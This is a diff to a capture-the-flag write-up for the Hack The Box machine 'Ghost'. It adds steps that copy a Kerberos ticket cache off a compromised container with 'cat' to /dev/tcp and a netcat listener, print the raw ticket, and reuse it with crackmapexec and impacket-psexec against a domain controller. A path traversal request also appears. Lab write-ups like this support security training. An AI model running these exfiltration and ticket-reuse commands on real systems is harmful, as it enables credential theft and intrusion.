@@ -542,7 +542,7 @@ curl -s "http://ghost.htb:8008/ghost/api/content/posts/?extra=../../../../proc/s
         .output();
 ```
 
-### 6.2. Getting a reverse shell from Ghost CMS container
+### 6.2. Getting a reverse shell from intranet container
 
 Let's test the code execution ability on the `scan` API.
 
@@ -596,7 +596,7 @@ id
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-### 6.3. Lateral movement
+## 7. Lateral movement to `dev-workstation` container
 
 Exploring the `docker-entrypoint.sh` of the container reveals that `ControlMaster` is configured
 
@@ -968,6 +968,8 @@ exec "$@"
 
 </details>
 
+## 8. Lateral movement with Kerberos cache ticket
+
 Kerberos ticket found at `/tmp/krb5cc_50`:
 
 ```console
@@ -988,3 +990,70 @@ PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
 _=/usr/bin/env
 OLDPWD=/tmp
 ```
+
+### 8.1. Transfer the ticket to Kali
+
+Setup a listener to receive the file:
+
+```sh
+nc -nvlp 4445 -q 1 > /tmp/krb5cc_50 < /dev/null
+```
+
+Simply `cat` the ticket to `/dev/tcp`
+
+```sh
+cat /tmp/krb5cc_50 > /dev/tcp/<kali-ip>/4445
+```
+
+```console
+root@kali:~# nc -nvlp 4445 -q 1 > /tmp/krb5cc_50 < /dev/null
+listening on [any] 4445 ...
+connect to [10.10.14.17] from (UNKNOWN) [10.10.11.24] 49826
+
+root@kali:~# cat /tmp/krb5cc_50
+
+        GHOST.HTBflorence.ramirez       GHOST.HTBflorence.ramirez
+                                                                 X-CACHECONF:krb5_ccache_conf_datapa_type␦krbtgt/GHOST.HTB@GHOST.HTB2   GHOST.HTBflorence.ramirez       GHOST.HTBkrbtgt GHOST.HTB d��
+�[���A�������݈/.�*=R׺jSaf�x�f�x�f�)f��  ��a��0���
+                                                        HOST.HTB�0��0rbtgt      HOST.HTB���0������������+n�n��A1���2`eL�J��ӛ���X���m�9%�p␦QQM����3�X��Q���ƒ     ��q�J���
+                                                                                                                                                                        � C�x9p`�
+                                                                                                                                                                                 `,␦$z����␦%��ܥh������/����G��2�K
+,�
+Ĝla*UAA����␦0;�Z�@�$M�=q $
+                          1��k
+                              6Ҵ        Mz��vu�K �s��۝�;��8r'"l%6�l�r��>2PiڭZx�2&��O
+                                                                                    �|�
+                                                                                       �ʸ��5��/'�>���$�9���֝(d(����!�4�Ҋ���6��m�����t1�q���f�m�Rzz�7ζ��i
+d�?HS?���K+�a�cs���N�8:0nsm>q]g��u6���Y���%��Xo2o�+�B��ê��+{�}K6�|�hk�C�y�X�|�6i��L���X,���l>.۬�ʊ����ܬ����(                                             M��r�,X�ui�']�
+�O��H����:oմ��>�<���)>�I����ͨ�Cڝ%�O?����!��<�K��Ȓp�|cU��`���X6�0hD��L5���x�GP��h@bdX�f]�2&�9�␦  ѯ�����j
+                                                                                                       ��yA룕I�|����gs�'l#��\�����z���.�&�}��ɮ���ˢ4'���i�������BQe��q�3��0#���e�ȵ���
+                                                                                                                                                                                    @V��_�J����=��Ԗg^���s[     �vj��y\ޥ&�i�+�G��gJ�o�t��bM6���5��=�����\��rG`�U�����P�+F�B��QJ��0�c��̕����3~��k������(���-����-ͯS�zT$�Q�)!<^諸�%��|�^-w����Ѱ���B�bZ��u�{��=
+```
+
+Testing ticket:
+
+```console
+root@kali:~# export KRB5CCNAME=/tmp/krb5cc_50
+
+root@kali:~# crackmapexec smb DC01.ghost.htb --use-kcache
+SMB         ghost.htb       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:ghost.htb) (signing:True) (SMBv1:False)
+SMB         ghost.htb       445    DC01             [+] ghost.htb\ from ccache
+
+root@kali:~# impacket-psexec GHOST.HTB/florence.ramirez@DC01.ghost.htb -k -no-pass
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+[*] Requesting shares on DC01.ghost.htb.....
+[-] share 'ADMIN$' is not writable.
+[-] share 'C$' is not writable.
+[-] share 'NETLOGON' is not writable.
+[-] share 'SYSVOL' is not writable.
+[-] share 'Users' is not writable.
+```
+
+> [!Note]
+>
+> Specifying to use kerberos cache for:
+> - `crackmapexec smb`: `--use-kcache` - Use Kerberos authentication from ccache file (`KRB5CCNAME`) (different from `-k` / `--kerberos`)
+> - `impacket-psexec`:
+>   - `-no-pass` - don't ask for password (useful for `-k`)
+>   - `-k` - Use Kerberos authentication. Grabs credentials from ccache file (`KRB5CCNAME`) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line
